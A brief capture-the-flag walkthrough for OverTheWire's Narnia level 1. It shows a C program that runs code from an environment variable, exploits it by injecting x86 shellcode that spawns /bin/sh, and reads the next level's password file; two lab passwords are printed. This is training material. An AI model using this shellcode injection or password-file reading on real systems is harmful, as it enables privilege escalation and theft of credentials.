# narnia 1

    # ssh narnia1@narnia.labs.overthewire.org
    password: efeidiedae

    # cat /games/narnia/narnia1.c

    #include <stdio.h>

    int main(){
        int (*ret)();

        if(getenv("EGG")==NULL){    
            printf("Give me something to execute at the env-variable EGG\n");
            exit(1);
        }

        printf("Trying to execute EGG!\n");
        ret = getenv("EGG");
        ret();

        return 0;
    }

    # export EGG=`echo -e "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"`
    # /games/narnia/narnia1
    # cat /etc/narnia_pass/narnia2
    nairiepecu

